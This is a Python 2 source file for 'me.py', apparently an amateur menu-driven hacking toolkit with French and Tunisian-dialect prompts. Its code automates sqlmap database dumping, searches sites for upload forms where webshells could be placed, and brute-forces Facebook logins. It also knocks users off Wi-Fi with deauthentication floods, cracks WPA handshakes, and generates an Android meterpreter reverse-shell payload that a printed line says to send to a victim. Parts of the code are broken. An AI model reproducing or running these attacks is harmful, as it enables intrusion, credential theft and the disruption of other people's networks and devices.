#!/usr/bin/python
# -*- coding: utf-8 -*-
# This was written for educational purpose and pentest only. Use it at your own risk.
# Author will not be responsible for any damage !!
# Toolname 	: me.py
# Programmer 	: fallag Kamel
# Version	: 1.0
# Date		: Thu nov 24 13:24:44 WIT 2016
# Special thanks to mywisdom to inspire me ;)
# define variable


import os
import subprocess
from subprocess import Popen, call, PIPE
import requests, re
from bs4 import BeautifulSoup
import re, urllib2, urllib, os, socket, sys
from platform import system
import http.server
import socketserver

# Console colors
W = '\033[1;0m'   # white
R = '\033[1;31m'  # red
G = '\033[1;32m'  # green
O = '\033[1;33m'  # orange
B = '\033[1;34m'  # blue
Y = '\033[1;93m'  # yellow
P = '\033[1;35m'  # purple
C = '\033[1;36m'  # cyan
GR = '\033[1;37m'  # gray

interface = 'wlan0'
minterface = interface
location = '/tmp/'
version = 'version 1.0'
about='kamel <contact@kamel.ga>'

def label():
	print R + '#'*80+ W
	print G + '##### ###### ##    ##    ######  #####  ##   ## ###### #### ####  ######  ##'
	print G + '##    ##  ## ##    ##    ##  ## ##      ##  ##  ##  ## ## ### ##  ##      ##'
	print C + '##### ###### ##    ##    ###### ## #### #####   ###### ##  #  ##  ######  ##'
	print C + '##    ##  ## ##    ##    ##  ## ##  ##  ##  ##  ##  ## ##     ##  ##      ##'
	print C + '##    ##  ## ##### ##### ##  ##  #####  ##   ## ##  ## ##     ##  ######  #####'
	print P + ' '*35+ ' '*3 + version + ' '*3 + C + '#'
	print R + '#'*80+ W
def memewifi():
	call('xterm -hold -e "netdiscover -p -i wlan0"', shell=True)
	choix=int(input("donner votre choix \n"))
	# press controle +C
	if(choix==1):
		call('gnome-terminal macof', shell=True)
	wifi()
def clean():
	call('rm -rf /tmp/jj*', shell=True)
	call('service network-manager restart', shell=True)
def findsp() :
	print "find upload forms from grabbed \n \twebsites the attacker may succeed to \n \tupload malicious files like webshells"
	upList = ['up.php', 'up1.php', 'up/up.php', 'site/up.php', 'vb/up.php', 'forum/up.php','blog/up.php', 'upload.php', 'upload1.php', 'upload2.php', 'vb/upload.php', 'forum/upload.php', 'blog/upload.php', 'site/upload.php', 'download.php']
	clearScr()
	site=raw_input('%s > lien download ' %  B)
	sites=raw_input('%s > lien download ' %  B)
	print "[~] Finding Upload"
	for site in sites :
		for up in upList :
			try :
				if (urllib.urlopen(site + up).getcode() == 200) :
					html = urllib.urlopen(site + up).readlines()
					for line in html :
						if re.findall('type=file', line) :
							print " [*] Found upload -> ", site+up
			except IOError :
				pass
def web():
    print"----------------------"
    print"1) search shell in website"
    print"2) scan wordpress"
    print"3) attack sqlmap"
    print"4) search admin page in website"
    print"5) create liste password speciale to file pass.lst"
    print"6) bruteforce fb with user agent different"
    print"7) bruteforce direct"
    print "8) search site from google"
    print"99) main menu"
    print"----------------------"
    choix=int(input("donner votre choix \n"))
    if (choix==1):
        liensite=raw_input('%s > lien site: ' %  B)
        call('perl tool/findshell.pl %s ' % (liensite), shell=True)
    if (choix==2):
        liensite=raw_input('%s > lien site: ' %  B)
        call('wpscan --url  %s ' % (liensite), shell=True)
    if (choix==3):
        print"search in google php?id=1"
        print"open des site if add ' and the site show error sql syntaxe add the site to the prog"
        liensite=raw_input('%s > lien site: ' %  B)
        call('sqlmap -u %s --dbs  ' % (liensite), shell=True)
        db=raw_input('%s > nom de bd: ' %  B)
        call('sqlmap -u %s -D %s --tables ' % (liensite,db), shell=True)
        nomdetable=raw_input('%s > nom de table: ' %  B)
        call('sqlmap -u %s -D %s -T %s --columns' % (liensite,db,nomdetable), shell=True)
        nomdecolumn=raw_input('%s > nom de colonne: ' %  B)
        call('sqlmap -u %s -D %s -T %s -C %s --dump' % (liensite,db,nomdetable,nomdecolumn), shell=True)
    if (choix==4):
        call('perl tool/adminpagefinder.pl ', shell=True)
    if (choix == 5):
        call('python tool/passgen.py', shell=True)
    if (choix == 6):
        call('python tool/fbbrutforce.py', shell=True)
    if (choix == 7):
        user = raw_input('%s > username: ' % B)
        nomliste = raw_input('%s > passliste ' % B)
        call('perl tool/fb.pl %s  %s' % (user, nomliste), shell=True)
    if (choix == 8):
        motsearch = raw_input("donner le mot\n")
        payload = {'q': motsearch, 'start': '0'}
        headers = {'User-agent': 'Mozilla/11.0'}
        req = requests.get('http://www.google.com/search', payload, headers=headers)
        soup = BeautifulSoup(req.text, 'html.parser')
        h3tags = soup.find_all('h3', class_='r')
        for h3 in h3tags:
            try:
                print(re.search('url\?q=(.+?)\&sa', h3.a['href']).group(1))
            except:
                continue
        menu()


    if (choix==99):
        menu()

def clearScr() :
	"""
	clear the screen in case of GNU/Linux or
	windows
	"""
	if system() == 'Linux':
		os.system('clear')
	if system() == 'Windows':
		os.system('cls')
def hosts():
	PORT = 8000
	Handler = http.server.SimpleHTTPRequestHandler
	httpd = socketserver.TCPServer(("127.0.0.1", PORT), Handler)
	print("serving at port 127.0.0.1", PORT)
	httpd.serve_forever()
	menu()
def install():
    print"----------------------"
    print '\n1) Fix cann\'t enable monitor mode'
    print '2) Install aircrack-ng'
    print '3) Install mdk3'
    print '4) Install cewl'
    print"99) main menu"
    print"----------------------"
    choix=int(input("donner votre choix \n"))
    if (choix == 1):
        call('airmon-ng check kill', shell=True)
    if (choix == 2):
        call('apt-get install aircrack-ng', shell=True)
    if (choix == 3):
        call('apt-get install mdk3', shell=True)
    if (choix == 4):
        call('apt-get install cewl', shell=True)
    if (choix==99):
        menu()
    install()
def systemu():
    print"----------------------"
    print"1) qwerty to azerty"
    print"2) erreur de son"
    print"3) update system"
    print"4) upgrade system"
    print"5) install package"
    print"99) main menu"
    print"----------------------"
    choix=int(input("donner votre choix \n"))
    if (choix==1):
        #qwerty to azerty
		call('setxkbmap fr', shell=True)
    if (choix==2):
        call('pulseaudio -D', shell=True)
    if (choix==3):
        call('apt-get update', shell=True)
    if (choix==4):
        call('apt-get upgrade', shell=True)
    if (choix==99):
        menu()
    if (choix==5):
        install()
    systemu()
def pc():
    print"----------------------"
    print"1) create payload android"
    print"99) main menu"
    print"----------------------"
    choix=int(input("donner votre choix \n"))
    if (choix==1):
		lip=raw_input('%s > HOST: ' %  B)
		lport= raw_input('%s > LPORTT :  ' %  B)
		lfile= raw_input('%s > nom file :  ' %  B)
		call('msfvenom -p android/meterpreter/reverse_tcp LHOST=%s LPORT=%s R > /root/%s' % (lip, lport , lfile), shell=True)
		print"men ba3d matab3thou lel victime 7el l armitrage > playload > android > reverse_tcp > t7ot l host w l port mte3k "
def hack():
    print"----------------------"
    print"1) web"
    print"2) wifi"
    print"3) pc"
    print"99) main menu"
    print"----------------------"
    choix=int(input("donner votre choix \n"))
    if (choix==1):
        web()
    if (choix==2):
        wifi()
    if (choix==3):
        pc()
    if (choix==99):
        menu()

def wifi():
	print"----------------------"
	print"1) attack with linset"
	print"2) view all wifi "
	print"3) attack point d acces wifi"
	print"4) kick out personne from wifi"
	print"5) voir ip deconnecte de meme serveur"
	print"6) attack with airodump-ng"
	print"99) main menu"
	print"----------------------"
	choix=int(input("donner votre choix \n"))
	if (choix==1):
		call('./tool/linset', shell=True)
	if (choix==2):
		call("gnome-terminal -e 'bash -c \"airodump-ng wlan0; exec bash\"'", shell=True)
	if (choix==3):
		handshakename = raw_input('%s > Enter name for handshake file (default=N): '  % option)
		if handshakename != 'N':
			f_handshake = location + handshakename
		n_targetBSSID = raw_input('%s > Enter name of file targetBSSID: ' % B)
		targetBSSID = raw_input('%s > Enter target BSSID: ' %  R)
		targetChannel = raw_input('%s > Enter target channel: ' %  R)
		f_targetBSSID = location + n_targetBSSID
		call('echo %s > %s' % (targetBSSID, f_targetBSSID), shell=True)
	 	call("gnome-terminal -e 'bash -c \"mdk3 %s d -b %s -c %s; exec bash\"'" % (minterface, f_targetBSSID, targetChannel), shell=True)
	 	call("gnome-terminal -e 'bash -c \"mdk3 %s a -m -i %s; exec bash\"'" % (minterface, targetBSSID), shell=True)
	if (choix==4):
		n_targetMAC = raw_input('%s > Enter name of file targetMAC: ' % B)
		f_targetMAC = location + n_targetMAC
		targetMAC = raw_input('%s > Enter target MAC: ' % R)
		call('echo %s > %s' % (targetMAC, f_targetMAC), shell=True)
		call('xterm -hold -e "mdk3 %s d -b %s"' % (minterface, f_targetMAC), shell=True)
	if (choix==5):
		memewifi()
	if (choix==99):
		menu()
	if (choix==6):
		call('airmon-ng start wlan0 ' , shell=True)
		call("gnome-terminal -e 'bash -c \"airodump-ng wlan0mon; exec bash\"'", shell=True)
		bssid= raw_input('%s > bssid' %  B)
		channel= raw_input('%s > channel' %  B)
		call("gnome-terminal -e 'bash -c \"airodump-ng --bssid %s --channel %s --write hacker wlan0mon\"'" % (bssid,channel), shell=True)
		userkick= raw_input('%s > user to kick them out from wifi' %  B)
		call('xterm -hold -e "aireplay-ng -0 1000 -a %s -c %s wlan0mon"' % (bssid,userkick), shell=True)
		call('xterm -hold -e "aireplay-ng -0 1000 -a %s -c %s wlan0mon"' % (bssid,userkick), shell=True)
		call('xterm -hold -e "aireplay-ng -0 1000 -a %s -c %s wlan0mon"' % (bssid,userkick), shell=True)
		call('xterm -hold -e "aireplay-ng -0 1000 -a %s -c %s wlan0mon"' % (bssid,userkick), shell=True)
		call('xterm -hold -e "aireplay-ng -0 1000 -a %s -c %s wlan0mon"' % (bssid,userkick), shell=True)
		filecap= raw_input('%s > addresee file de cap' %  B)
		filetxt= raw_input('%s > addresee file de wordlist' %  B)
		call('aircrack-ng %s -w %s' % (filecap,filetxt), shell=True)
def androidstudio():
	call("LD_PRELOAD='/usr/lib/x86_64-linux-gnu/libstdc++.so.6' ~/Android/Sdk/tools/emulator -netdelay none -netspeed full -avd Nexus_5_API_25", shell=True)

	wifi()
def download():
    liendownload= raw_input('%s > lien download ' %  B)
    fp = open('down.txt', 'a')
    fp.write(liendownload)
    call('axel -n 10 -s 500000 -o /root/Downloads/ %s' % (liendownload), shell=True)
def printHelp():
    print"l mara e jeya"

def menu():
    print"----------------------"
    print"1) system"
    print"2) hack"
    print"3) download"
    print"4) help"
    print"98) version"
    print"99) exit"
    print"----------------------"
    choix=int(input("donner votre choix \n"))
    if (choix==1):
        systemu()
    if (choix==2):
        hack()
    if (choix==3):
        download()
    if (choix==4):
        printHelp()
    if (choix == 98):
        print W + '\nVersion: ' + C + '%s' % version
        print W + 'Feedback me: ' + G + ' %s' % about
    if (choix==99):
        exit(0)
label()
menu()



    








